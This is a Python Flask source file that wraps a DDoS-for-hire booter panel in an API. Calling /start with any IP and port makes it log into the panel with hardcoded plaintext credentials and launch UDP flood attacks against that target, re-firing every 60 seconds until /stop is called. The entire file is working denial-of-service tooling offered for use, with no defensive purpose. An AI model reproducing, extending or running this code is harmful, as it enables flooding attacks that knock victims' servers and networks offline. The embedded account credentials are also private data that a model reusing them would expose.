from flask import Flask, request, jsonify
import httpx
import asyncio
import threading
import time
import re
import uuid

app = Flask(__name__)

# --- CONFIG ---
BASE_URL = "https://hardstresser.org"
USERNAME = "SajagOG1"
PASSWORD = "Jaiisbeast@1"
DEFAULT_TIME = "60"

# Tracking active threads
active_tasks = {}

HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "referer": f"{BASE_URL}/panel/booter.php"
}

async def get_latest_id(client):
    """Sniper for Line 84 ID pattern."""
    try:
        resp = await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/attacks.php")
        match = re.search(r'a(\d{5,8})', resp.text)
        if match: return match.group(1)
        match = re.search(r'id=(\d{5,8})', resp.text)
        if match: return match.group(1)
        return None
    except: return None

async def attack_loop(task_id, ip, port):
    """The background reloader logic."""
    async with httpx.AsyncClient(headers=HEADERS, follow_redirects=True, timeout=40.0) as client:
        # Step 1: Login
        await client.post(f"{BASE_URL}/panel/login.php", 
                         data={"kullaniciadi": USERNAME, "sifreniz": PASSWORD})
        
        while task_id in active_tasks:
            print(f"[LOOP] Task {task_id} firing on {ip}:{port}")
            
            p = {"type": "start", "host": ip, "port": port, "time": DEFAULT_TIME, "method": "UDP", "vip": "0"}
            
            try:
                # Fire start
                await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", params=p)
                
                # Snipe ID immediately after
                await asyncio.sleep(2)
                panel_id = await get_latest_id(client)
                active_tasks[task_id]['panel_id'] = panel_id
                
                # Wait for attack duration (checking for stop every second)
                expire_at = time.time() + int(DEFAULT_TIME)
                while time.time() < expire_at:
                    if task_id not in active_tasks:
                        if panel_id:
                            print(f"[STOP] Killing ID {panel_id} for Task {task_id}")
                            await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", 
                                             params={"type": "stop", "id": panel_id})
                        return
                    await asyncio.sleep(1)
                    
            except Exception as e:
                print(f"[ERR] Loop Error: {e}")
                await asyncio.sleep(5)

def start_background_loop(task_id, ip, port):
    asyncio.run(attack_loop(task_id, ip, port))

# --- ROUTES ---

@app.route('/')
def health_check():
    return jsonify({"status": "online", "active_tasks": len(active_tasks)})

@app.route('/start', methods=['GET'])
def api_start():
    ip = request.args.get('ip')
    port = request.args.get('port')
    
    if not ip or not port:
        return jsonify({"error": "IP and Port required"}), 400

    task_id = str(uuid.uuid4())[:8]
    active_tasks[task_id] = {"ip": ip, "port": port, "panel_id": None}
    
    # Start thread
    t = threading.Thread(target=start_background_loop, args=(task_id, ip, port))
    t.daemon = True
    t.start()
    
    return jsonify({
        "status": "started",
        "taskid": task_id,
        "target": f"{ip}:{port}"
    })

@app.route('/stop', methods=['GET'])
def api_stop():
    task_id = request.args.get('taskid')
    if task_id in active_tasks:
        del active_tasks[task_id]
        return jsonify({"status": "success", "message": f"Task {task_id} stopped."})
    return jsonify({"error": "Task ID not found"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
